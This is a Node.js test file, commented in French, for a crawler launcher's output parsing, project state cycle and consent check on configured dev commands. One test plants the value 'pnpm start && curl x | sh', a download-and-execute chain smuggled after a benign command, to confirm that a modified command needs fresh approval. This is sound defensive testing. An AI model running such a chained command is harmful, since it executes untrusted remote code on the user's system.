/**
 * Le lancement du crawl, sans en lancer un.
 *
 * Ce qui est éprouvé ici est ce qui n'a pas besoin d'un navigateur : le
 * découpage du flux du crawler en lignes, la lecture de ses annonces, et le
 * cycle « projet pris, projet rendu » face à un vrai processus.
 *
 * Le dernier lance bien `crawl/index.js`, mais sur un dossier sans
 * configuration : le crawler refuse dans `loadConfig`, bien avant d'ouvrir un
 * navigateur. Faire scanner une vraie application à chaque `pnpm test`
 * demanderait un serveur et un Chrome — c'est ce que la garde d'exécution
 * directe de `ovrsee-post-commit.js` évite déjà, pour la même raison.
 */

import test from 'node:test'
import assert from 'node:assert/strict'
import { mkdtempSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { setTimeout as attendre } from 'node:timers/promises'

import { accordRequis, decoupe, devSurDisque, progression, crawlState, startCrawl, stopCrawl } from './crawl.js'
import { approuver } from '../crawl/confiance.js'

/** Magasin de confiance jetable — jamais le profil réel de la machine. */
function magasinNeuf() {
  process.env.OVRSEE_TRUST = join(mkdtempSync(join(tmpdir(), 'ovrsee-trust-')), 'trust.json')
}

// Posé dès le chargement, et pas seulement dans les cas qui l'utilisent : le
// crawler lancé plus bas hérite de l'environnement de cette suite.
magasinNeuf()

/** Un projet avec la commande `dev` donnée dans sa configuration. */
function projetAvecDev(dev) {
  const dir = mkdtempSync(join(tmpdir(), 'ovrsee-accord-'))
  writeFileSync(join(dir, 'ovrsee.config.json'), JSON.stringify(dev === null ? {} : { dev }))
  return dir
}

test('decoupe rend les lignes complètes et reporte le reste', () => {
  const premier = decoupe('', '[crawl] une\n[crawl] deu')
  assert.deepEqual(premier.lines, ['[crawl] une'])
  assert.equal(premier.reste, '[crawl] deu')

  // La suite du morceau coupé se recolle, elle ne se perd pas et ne se
  // dédouble pas : c'est tout l'intérêt de reporter le reste.
  const second = decoupe(premier.reste, 'x\n')
  assert.deepEqual(second.lines, ['[crawl] deux'])
  assert.equal(second.reste, '')
})

test('decoupe ignore les lignes vides', () => {
  const { lines } = decoupe('', '\n\n[crawl] seule\n\n')
  assert.deepEqual(lines, ['[crawl] seule'])
})

test("decoupe d'un morceau sans saut de ligne ne rend rien encore", () => {
  const { lines, reste } = decoupe('', 'pas fini')
  assert.deepEqual(lines, [])
  assert.equal(reste, 'pas fini')
})

test('progression ne retient que ce que le crawler annonce', () => {
  assert.equal(progression('[crawl] 3 page(s) écrite(s)'), '3 page(s) écrite(s)')
  // Une ligne qui ne vient pas du crawler ne devient pas une progression : le
  // serveur de dev du projet écrit sur le même flux.
  assert.equal(progression('vite v8 ready in 200 ms'), null)
})

test("l'état au repos ne désigne aucun projet", () => {
  assert.deepEqual(crawlState(), { running: false, project: null, line: null })
})

test('un crawl occupe son projet, puis le rend en finissant', async () => {
  // Un dossier sans configuration : le crawler refuse dans `loadConfig`, bien
  // avant d'ouvrir un navigateur. Ce qui est éprouvé ici n'est pas le scan,
  // c'est le cycle — le projet est pris, puis rendu.
  const dir = mkdtempSync(join(tmpdir(), 'ovrsee-crawl-etat-'))

  const depart = startCrawl(dir)
  assert.equal(depart.running, true)
  assert.equal(depart.project, dir)

  // Une seconde demande ne lance pas un second crawl : elle rend l'état.
  assert.deepEqual(startCrawl(dir), depart)

  for (let reste = 100; reste > 0 && crawlState().running; reste--) await attendre(50)

  assert.deepEqual(crawlState(), { running: false, project: null, line: null })

  // Arrêter ce qui n'existe plus est sans effet, pas une erreur.
  assert.deepEqual(stopCrawl(dir), { running: false, project: null, line: null })
})

// --- l'accord demandé avant le crawl --------------------------------------

test('sans configuration lisible, aucun accord n’est requis', () => {
  magasinNeuf()
  const dir = mkdtempSync(join(tmpdir(), 'ovrsee-sans-config-'))

  // Il n'y a rien à approuver : le crawl échouera faute de configuration, et
  // c'est cet échec-là qui doit s'écrire, pas une question sans objet.
  assert.equal(devSurDisque(dir), null)
  assert.equal(accordRequis(dir), false)
})

test('une commande jamais vue demande l’accord', () => {
  magasinNeuf()
  const dir = projetAvecDev('pnpm start')

  assert.equal(devSurDisque(dir), 'pnpm start')
  assert.equal(accordRequis(dir), true)
})

test('une commande approuvée ne redemande rien', () => {
  magasinNeuf()
  const dir = projetAvecDev('pnpm start')

  approuver(dir, 'pnpm start')

  assert.equal(accordRequis(dir), false)
})

test('une commande modifiée depuis l’accord le redemande', () => {
  magasinNeuf()
  const dir = projetAvecDev('pnpm start')
  approuver(dir, 'pnpm start')

  writeFileSync(join(dir, 'ovrsee.config.json'), JSON.stringify({ dev: 'pnpm start && curl x | sh' }))

  assert.equal(accordRequis(dir), true)
})

test('une configuration sans dev porte sur le même défaut que le crawler', () => {
  magasinNeuf()
  const dir = projetAvecDev(null)

  // Deux défauts divergents feraient approuver une chaîne et en exécuter une
  // autre : le crawl refuserait ensuite un projet qu'on vient d'autoriser.
  assert.equal(devSurDisque(dir), 'pnpm dev')
  approuver(dir, 'pnpm dev')
  assert.equal(accordRequis(dir), false)
})
